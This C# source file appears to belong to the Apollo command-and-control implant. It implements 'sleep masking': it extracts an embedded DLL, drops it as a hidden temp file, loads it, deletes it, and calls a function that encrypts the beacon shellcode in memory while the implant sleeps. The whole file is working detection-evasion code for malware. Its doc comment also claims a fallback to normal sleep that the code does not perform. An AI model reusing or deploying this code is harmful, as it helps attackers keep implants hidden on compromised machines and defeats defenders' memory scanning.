using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace ApolloInterop.Classes.Core
{
    public static class SleepMask
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void MaskedSleepDelegate(uint dwMilliseconds);

        private static IntPtr _hModule = IntPtr.Zero;
        private static MaskedSleepDelegate _maskedSleep = null;
        private static readonly object _lock = new object();
        private static bool _initAttempted = false;
        private static bool _available = false;
        private static bool _enabled = false;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibraryW(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        public static bool Enabled
        {
            get { return _enabled; }
            set { _enabled = value; }
        }

        public static bool IsAvailable
        {
            get
            {
                if (!_enabled)
                    return false;
                if (!_initAttempted)
                    Initialize();
                return _available;
            }
        }

        private static byte[] GetEmbeddedDll()
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            string[] names = asm.GetManifestResourceNames();
            foreach (string name in names)
            {
                if (name.IndexOf("D1rkSleep", StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    using (Stream stream = asm.GetManifestResourceStream(name))
                    {
                        if (stream != null)
                        {
                            byte[] buffer = new byte[stream.Length];
                            stream.Read(buffer, 0, buffer.Length);
                            return buffer;
                        }
                    }
                }
            }
            return null;
        }

        private static void Initialize()
        {
            lock (_lock)
            {
                if (_initAttempted) return;
                _initAttempted = true;

                try
                {
                    byte[] dllBytes = GetEmbeddedDll();
                    if (dllBytes == null || dllBytes.Length == 0)
                        return;

                    string tempDir = Path.GetTempPath();
                    string fileName = Guid.NewGuid().ToString("N").Substring(0, 8) + ".tmp";
                    string tempPath = Path.Combine(tempDir, fileName);

                    File.WriteAllBytes(tempPath, dllBytes);

                    try
                    {
                        File.SetAttributes(tempPath, FileAttributes.Hidden | FileAttributes.System);
                    }
                    catch { }

                    _hModule = LoadLibraryW(tempPath);

                    try
                    {
                        File.Delete(tempPath);
                    }
                    catch { }

                    if (_hModule == IntPtr.Zero)
                        return;

                    IntPtr pFunc = GetProcAddress(_hModule, "MaskedSleep");
                    if (pFunc == IntPtr.Zero)
                    {
                        FreeLibrary(_hModule);
                        _hModule = IntPtr.Zero;
                        return;
                    }

                    _maskedSleep = (MaskedSleepDelegate)Marshal.GetDelegateForFunctionPointer(
                        pFunc, typeof(MaskedSleepDelegate));
                    _available = true;
                }
                catch
                {
                    _available = false;
                }
            }
        }

        /// <summary>
        /// Performs an obfuscated sleep using the masker DLL. The beacon shellcode
        /// region (registered by the loader via SetBeaconRegion) is encrypted during
        /// the sleep window and decrypted on wake.
        /// Falls back to normal sleep if the masker is not available.
        /// </summary>
        public static void ObfuscatedSleep(uint milliseconds)
        {
            if (!IsAvailable || milliseconds == 0)
                return;

            _maskedSleep(milliseconds);
        }

        public static void Cleanup()
        {
            lock (_lock)
            {
                _maskedSleep = null;
                _available = false;
                if (_hModule != IntPtr.Zero)
                {
                    FreeLibrary(_hModule);
                    _hModule = IntPtr.Zero;
                }
            }
        }
    }
}
